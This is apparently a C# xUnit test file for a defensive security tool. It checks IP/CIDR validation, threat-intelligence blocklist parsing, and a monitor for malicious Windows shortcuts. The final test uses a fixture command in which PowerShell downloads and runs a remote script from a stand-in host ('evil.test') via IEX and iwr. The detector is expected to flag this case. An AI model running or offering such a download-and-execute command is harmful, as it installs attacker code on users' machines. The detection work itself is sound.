using System;
using System.Linq;
using Xunit;
using Sentinel.Core;

namespace Sentinel.Tests.Monitors
{
    public class ThreatIntelAndLnkTests
    {
        [Theory]
        [InlineData("1.2.3.4", true)]
        [InlineData("10.0.0.1", true)]
        [InlineData("1.2.3.4/24", true)]
        [InlineData("1.2.3.4/8", true)]
        [InlineData("1.2.3.4/32", true)]
        [InlineData("1.2.3.4/7", false)]   // too broad
        [InlineData("1.2.3.4/33", false)]  // invalid prefix
        [InlineData("not-an-ip", false)]
        [InlineData("", false)]
        [InlineData("2001:db8::1", false)] // IPv6 not supported by this blocker
        [InlineData("1.2.3", false)]
        public void ThreatIntel_IsValidIpOrCidr(string value, bool expected)
        {
            Assert.Equal(expected, ThreatIntelFeedBlocker.IsValidIpOrCidr(value));
        }

        [Fact]
        public void ThreatIntel_ParseFeed_SpamhausDrop_IgnoresCommentsAndExtractsCidrs()
        {
            var body = @"
; Spamhaus DROP List
; Last-Modified: test
1.2.3.0/24 ; SBL123
# comment line
5.6.7.0/22 ; SBL456
not-valid
8.8.8.8/32 ; SBL999
";
            var ips = ThreatIntelFeedBlocker.ParseFeed(body, "Spamhaus-DROP");
            Assert.Equal(3, ips.Count);
            Assert.Contains("1.2.3.0/24", ips);
            Assert.Contains("5.6.7.0/22", ips);
            Assert.Contains("8.8.8.8/32", ips);
        }

        [Fact]
        public void ThreatIntel_ParseFeed_FeodoStyle_OneIpPerLine()
        {
            var body = @"
# Feodo Tracker
# Comment
185.220.101.1
45.33.32.156 ; botnet
# another comment
invalid-line
203.0.113.50
";
            var ips = ThreatIntelFeedBlocker.ParseFeed(body, "Feodo-Tracker");
            Assert.Equal(3, ips.Count);
            Assert.Contains("185.220.101.1", ips);
            Assert.Contains("45.33.32.156", ips);
            Assert.Contains("203.0.113.50", ips);
        }

        [Fact]
        public void ThreatIntel_ParseFeed_EmergingThreats_SkipsEmptyAndHashes()
        {
            var body = "# ET block list\n\n\n9.9.9.9\n# end\n";
            var ips = ThreatIntelFeedBlocker.ParseFeed(body, "EmergingThreats");
            Assert.Single(ips);
            Assert.Equal("9.9.9.9", ips[0]);
        }

        [Fact]
        public void ThreatIntel_ParseFeed_DoesNotAllowOverlyBroadCidr()
        {
            var body = "0.0.0.0/0 ; bad\n1.2.3.0/7 ; too broad\n1.2.3.0/24 ; ok\n";
            var ips = ThreatIntelFeedBlocker.ParseFeed(body, "Spamhaus-DROP");
            Assert.Single(ips);
            Assert.Equal("1.2.3.0/24", ips[0]);
        }

        [Fact]
        public void LnkShortcutMonitor_BenignLocalShortcut_NotMalicious()
        {
            Assert.False(LnkShortcutMonitor.IsMaliciousShortcut(
                @"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE",
                @"/n ""C:\Users\me\Documents\report.docx"""));
        }

        [Fact]
        public void LnkShortcutMonitor_PowerShellHttpDownload_IsRemoteLauncher()
        {
            Assert.True(LnkShortcutMonitor.IsMaliciousShortcut(
                @"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                @"-enc ABC -c IEX (iwr https://evil.test/a.ps1)",
                out var vector));
            Assert.Equal("RemoteLauncher", vector);
        }
    }
}
